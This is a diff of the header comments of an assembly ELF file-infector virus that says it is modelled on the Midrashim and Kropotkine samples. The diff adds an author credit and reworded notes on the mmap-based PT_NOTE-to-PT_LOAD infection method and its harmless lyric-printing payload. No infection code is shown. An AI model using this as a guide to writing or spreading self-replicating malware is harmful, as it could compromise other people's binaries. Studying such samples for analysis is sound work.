@@ -1,15 +1,16 @@
 ;-----------------------------------------------------------------------------------insert-coin--;
+; Written by defectiv3                                                                           ;
+;                                                                                                ;
 ; A case study and implementation of the PT_NOTE->PT_LOAD infector, based on the tmp0ut's 1.01   ;
 ; article and highly ~~copied from~~ inspired by Linux.Midrashim and with some notes of          ;
 ; Linux.Kropotkine.                                                                              ;
 ;                                                                                                ;
 ; It mostly works the same as Midrashim but has some smol differences, such as mapping the       ;
-; infected file into memory using mmap() and... that's it (. ᴗ .)                                ;
-; However it does not detect if it's on a first run, nor is the payload encrypted. May that      ;
-; change during our lifetime                                                                     ;
+; infected file into memory using mmap() and... that's it. (. ᴗ .) However it does not detect if ;
+; it's on a first run, nor is the payload encoded. May that change during our lifetime~          ;
 ;                                                                                                ;
 ; Payload doesn't bite, just prints the lyrics to "I, dogma", the opening to the Doom (2016)     ;
-; soundtrack, pretty random but it's a cool intro                                                ;
+; soundtrack, pretty random but it's a cool intro!                                               ;
 ;                                                                                                ;
 ; compile with> nasm -f elf64 infector.s -o infector.o; ld -o infector infector.s                ;
 ;                                                                                                ;
@@ -21,6 +22,7 @@
 ; - https://tmpout.sh/1/Linux.Kropotkine.asm                                                     ;
 ; - elf64 spec; intel manual vol. 2 (for ixs details); nasm docs (for nasm specific stuff)       ;
 ;------------------------------------------------------------------------------------------------;
+
 
 ;-------------- syscalls ---------------;
 %define SYS_WRITE       1               ;
